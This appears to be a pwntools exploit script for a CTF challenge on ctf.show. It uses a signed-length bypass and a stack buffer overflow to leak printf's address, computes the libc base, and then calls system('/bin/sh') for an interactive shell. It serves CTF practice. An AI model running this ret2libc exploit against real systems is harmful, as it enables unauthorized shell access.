from pwn import *
context(arch = 'i386',os = 'linux',log_level = 'debug')
io =remote('pwn.challenge.ctf.show',28279)
elf = ELF('./pwn')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')  # 使用系统默认的 libc 文件路径
io.sendlineafter(b'read?',b'-1')
io.recv()
main = elf.symbols['main']
printf_got = elf.got['printf']
printf_plt = elf.plt['printf']
payload = b'a'*(0x2c + 4)+p32(printf_plt) + p32(main) + p32(printf_got)
io.sendline(payload)
printf = u32(io.recv(4))
print(hex(printf))
libc_base = printf - libc.symbols['printf']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
io.sendlineafter(b'read?',b'-1')
io.recv()
payload = b'a'*(0x2c + 4)+p32(system) + p32(main) + p32(binsh)
io.sendline(payload)
io.interactive()

